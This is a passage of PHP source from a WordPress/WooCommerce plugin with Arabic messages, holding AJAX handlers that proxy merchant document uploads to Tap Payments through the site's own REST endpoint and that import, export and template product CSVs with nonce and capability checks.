    if ( empty( $_FILES['document'] ) || empty( $_FILES['document']['tmp_name'] ) ) {
        wp_send_json_error( array( 'message' => 'لم يُرفق ملف.' ), 400 );
    }
    $upload_err = (int) ( $_FILES['document']['error'] ?? UPLOAD_ERR_OK );
    if ( UPLOAD_ERR_OK !== $upload_err ) {
        wp_send_json_error( array( 'message' => 'فشل رفع الملف (' . $upload_err . ').' ), 400 );
    }
    $size_kb = (int) ( ( $_FILES['document']['size'] ?? 0 ) / 1024 );
    if ( $size_kb > (int) $purposes[ $purpose ]['max_kb'] ) {
        wp_send_json_error( array(
            'message' => sprintf( 'حجم الملف (%dKB) يتجاوز الحد الأقصى (%dKB) لهذا النوع.', $size_kb, (int) $purposes[ $purpose ]['max_kb'] ),
        ), 400 );
    }

    // إعادة توجيه الملف إلى REST proxy داخل tap-payments الذي يرفعه إلى المنصة ثم Tap.
    $url = rest_url( 'yaamama-tap/v1/upload-document' );
    $boundary = 'yamamah-doc-' . wp_generate_password( 16, false );
    $eol      = "\r\n";

    $original_name = (string) ( $_FILES['document']['name'] ?? 'document' );
    $tmp_path      = (string) $_FILES['document']['tmp_name'];
    $mime          = (string) ( $_FILES['document']['type'] ?? 'application/octet-stream' );

    $contents = file_get_contents( $tmp_path );
    if ( false === $contents ) {
        wp_send_json_error( array( 'message' => 'تعذّر قراءة الملف.' ), 500 );
    }

    $body  = '';
    $body .= '--' . $boundary . $eol;
    $body .= 'Content-Disposition: form-data; name="purpose"' . $eol . $eol;
    $body .= $purpose . $eol;
    $body .= '--' . $boundary . $eol;
    $body .= 'Content-Disposition: form-data; name="title"' . $eol . $eol;
    $body .= sanitize_text_field( (string) ( $purposes[ $purpose ]['label'] ?? $purpose ) ) . $eol;
    $body .= '--' . $boundary . $eol;
    $body .= 'Content-Disposition: form-data; name="file"; filename="' . sanitize_file_name( $original_name ) . '"' . $eol;
    $body .= 'Content-Type: ' . $mime . $eol . $eol;
    $body .= $contents . $eol;
    $body .= '--' . $boundary . '--' . $eol;

    $response = wp_remote_post( $url, array(
        'timeout' => 60,
        'headers' => array(
            'Content-Type' => 'multipart/form-data; boundary=' . $boundary,
            'Accept'       => 'application/json',
            'Cookie'       => $_SERVER['HTTP_COOKIE'] ?? '',
            'X-WP-Nonce'   => wp_create_nonce( 'wp_rest' ),
        ),
        'body'    => $body,
    ) );

    if ( is_wp_error( $response ) ) {
        wp_send_json_error( array( 'message' => 'فشل الاتصال بـ REST: ' . $response->get_error_message() ), 502 );
    }
    $code = (int) wp_remote_retrieve_response_code( $response );
    $data = json_decode( (string) wp_remote_retrieve_body( $response ), true );

    if ( $code >= 400 || empty( $data['file_id'] ) ) {
        $msg = is_array( $data ) && isset( $data['message'] ) ? (string) $data['message'] : "Upload failed (HTTP {$code})";
        wp_send_json_error( array( 'message' => $msg, 'data' => $data ), $code ?: 502 );
    }

    wp_send_json_success( array(
        'file_id' => $data['file_id'],
        'purpose' => $purpose,
        'name'    => $original_name,
        'size'    => $data['size'] ?? null,
        'type'    => $data['type'] ?? null,
        'label'   => $purposes[ $purpose ]['label'],
    ) );
}

add_action( 'wp_ajax_yamamah_remove_tap_document', 'yamamah_ajax_remove_tap_document' );
function yamamah_ajax_remove_tap_document() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح.' ), 403 );
    }
    $purpose  = isset( $_POST['purpose'] ) ? sanitize_text_field( wp_unslash( $_POST['purpose'] ) ) : '';
    $purposes = yamamah_tap_doc_purposes();
    if ( ! isset( $purposes[ $purpose ] ) ) {
        wp_send_json_error( array( 'message' => 'نوع الوثيقة غير معروف.' ), 400 );
    }
    $key = 'yamama_tap_doc_' . sanitize_key( $purpose );
    delete_option( $key );
    delete_option( $key . '_meta' );
    wp_send_json_success( array( 'purpose' => $purpose ) );
}

add_action( 'wp_ajax_yamamah_get_tap_documents', 'yamamah_ajax_get_tap_documents' );
function yamamah_ajax_get_tap_documents() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    if ( ! current_user_can( 'manage_woocommerce' ) ) {
        wp_send_json_error( array( 'message' => 'غير مصرح.' ), 403 );
    }
    $purposes = yamamah_tap_doc_purposes();
    $out      = array();
    foreach ( array_keys( $purposes ) as $purpose ) {
        $key     = 'yamama_tap_doc_' . sanitize_key( $purpose );
        $file_id = (string) get_option( $key, '' );
        $meta    = (array) get_option( $key . '_meta', array() );
        $out[ $purpose ] = array(
            'file_id'  => $file_id,
            'uploaded' => $file_id !== '',
            'name'     => $meta['name'] ?? '',
            'size'     => (int) ( $meta['size'] ?? 0 ),
            'type'     => $meta['type'] ?? '',
        );
    }
    wp_send_json_success( $out );
}

/* =====================================================================
 * Products CSV Import / Export — متاح فقط لمتاجر retail
 * ===================================================================== */

if ( ! function_exists( 'yamamah_csv_check_perms' ) ) {
    function yamamah_csv_check_perms() {
        if ( ! current_user_can( 'manage_woocommerce' ) ) {
            wp_send_json_error( array( 'message' => 'غير مصرح.' ), 403 );
        }
        if ( function_exists( 'yamamah_get_store_type' ) && yamamah_get_store_type() !== 'retail' ) {
            wp_send_json_error( array( 'message' => 'متاح فقط لمتاجر retail.' ), 403 );
        }
    }
}

add_action( 'wp_ajax_yamamah_download_products_template', 'yamamah_ajax_download_products_template' );
function yamamah_ajax_download_products_template() {
    if ( ! wp_verify_nonce( $_REQUEST['nonce'] ?? '', 'yamamah_nonce' ) ) {
        wp_die( 'Bad nonce', '', array( 'response' => 403 ) );
    }
    yamamah_csv_check_perms();
    if ( ! class_exists( 'Yamamah_CSV' ) ) {
        require_once YAMAMAH_PLUGIN_DIR . 'includes/class-yamamah-csv.php';
    }
    Yamamah_CSV::output_template();
    exit;
}

add_action( 'wp_ajax_yamamah_export_products_csv', 'yamamah_ajax_export_products_csv' );
function yamamah_ajax_export_products_csv() {
    if ( ! wp_verify_nonce( $_REQUEST['nonce'] ?? '', 'yamamah_nonce' ) ) {
        wp_die( 'Bad nonce', '', array( 'response' => 403 ) );
    }
    yamamah_csv_check_perms();
    if ( ! class_exists( 'Yamamah_CSV' ) ) {
        require_once YAMAMAH_PLUGIN_DIR . 'includes/class-yamamah-csv.php';
    }
    @set_time_limit( 0 );
    Yamamah_CSV::export_all();
    exit;
}

add_action( 'wp_ajax_yamamah_import_products_csv', 'yamamah_ajax_import_products_csv' );
function yamamah_ajax_import_products_csv() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    yamamah_csv_check_perms();
    if ( ! class_exists( 'Yamamah_CSV' ) ) {
        require_once YAMAMAH_PLUGIN_DIR . 'includes/class-yamamah-csv.php';
    }

    if ( empty( $_FILES['csv_file'] ) || empty( $_FILES['csv_file']['tmp_name'] ) ) {
        wp_send_json_error( array( 'message' => 'لم يُرفق ملف CSV.' ), 400 );
    }
    $upload_err = (int) ( $_FILES['csv_file']['error'] ?? UPLOAD_ERR_OK );
    if ( UPLOAD_ERR_OK !== $upload_err ) {
        wp_send_json_error( array( 'message' => 'خطأ في الرفع (' . $upload_err . ').' ), 400 );
    }
    $size_kb = (int) ( ( $_FILES['csv_file']['size'] ?? 0 ) / 1024 );
    if ( $size_kb > 51200 ) {
        wp_send_json_error( array( 'message' => 'حجم الملف يتجاوز 50MB.' ), 400 );
    }

    $opts = array(
        'update_existing'   => ( ( $_POST['update_existing'] ?? '0' ) === '1' ),
        'create_categories' => ( ( $_POST['create_categories'] ?? '0' ) === '1' ),
    );

    $upload_dir = wp_upload_dir();
    $target_dir = trailingslashit( $upload_dir['basedir'] ) . 'yamamah-imports';
    if ( ! file_exists( $target_dir ) ) {
        wp_mkdir_p( $target_dir );
    }
    $unique = wp_unique_filename( $target_dir, sanitize_file_name( $_FILES['csv_file']['name'] ) );
    $dest   = trailingslashit( $target_dir ) . $unique;
    if ( ! move_uploaded_file( $_FILES['csv_file']['tmp_name'], $dest ) ) {
        wp_send_json_error( array( 'message' => 'فشل حفظ الملف على الخادم.' ), 500 );
    }

    // عُد عدد السطور لتقرير ما إذا كنا سنشغّل بشكل متزامن أو في الخلفية
    $row_count = 0;
    $fh = fopen( $dest, 'r' );
    if ( $fh ) {
        while ( ! feof( $fh ) ) {
            if ( fgets( $fh ) !== false ) $row_count++;
        }
        fclose( $fh );
    }
    $row_count = max( 0, $row_count - 1 );

    if ( $row_count > 100 ) {
        wp_schedule_single_event( time() + 5, 'yamamah_process_csv_import', array( $dest, $opts ) );
        wp_send_json_success( array(
            'scheduled' => true,
            'total'     => $row_count,
            'message'   => 'تم استلام الملف. سيتم معالجة ' . $row_count . ' سطر في الخلفية.',
        ) );
    }

    @set_time_limit( 0 );
    $summary = Yamamah_CSV::process_file( $dest, $opts );
    $summary['date'] = current_time( 'mysql' );
    update_option( 'yamamah_last_csv_import', $summary, false );
    @unlink( $dest );

    wp_send_json_success( $summary );
}

add_action( 'wp_ajax_yamamah_get_import_status', 'yamamah_ajax_get_import_status' );
function yamamah_ajax_get_import_status() {
    check_ajax_referer( 'yamamah_nonce', 'nonce' );
    yamamah_csv_check_perms();
    wp_send_json_success( get_option( 'yamamah_last_csv_import', array() ) );
}
